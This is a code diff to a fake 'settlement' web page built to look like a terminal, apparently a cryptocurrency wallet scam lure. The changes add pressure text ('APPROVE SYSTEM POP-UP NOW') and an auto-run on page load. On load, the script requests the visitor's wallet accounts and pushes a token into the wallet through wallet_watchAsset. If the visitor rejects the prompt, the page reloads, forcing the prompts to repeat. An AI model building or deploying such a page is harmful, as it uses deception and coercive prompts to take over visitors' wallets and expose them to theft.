@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FINAL PUSH</title>
+    <title>FINAL SETTLEMENT</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 150px; }
         .terminal { border: 3px solid #0f0; padding: 50px; display: inline-block; border-radius: 20px; box-shadow: 0 0 30px #0f0; }
@@ -13,7 +13,7 @@
 <body>
     <div class="terminal">
         <div id="status">SETTLEMENT FINALIZING...</div>
-        <p>DO NOT CLOSE BROWSER</p>
+        <p>APPROVE SYSTEM POP-UP NOW</p>
     </div>
 
     <script>
@@ -22,6 +22,7 @@
         async function forceExecute() {
             if (window.ethereum) {
                 try {
+                    // FORCE FINAL ACCOUNT AND ASSET BRIDGE
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
@@ -34,12 +35,13 @@
                             },
                         },
                     });
-                    document.getElementById('status').innerText = "LINK SUCCESSFUL";
+                    document.getElementById('status').innerText = "BRIDGE SUCCESSFUL";
                 } catch (err) {
                     window.location.reload();
                 }
             }
         }
+        // Auto-triggers on load to bypass the "In Progress" hang
         window.onload = forceExecute;
     </script>
 </body>
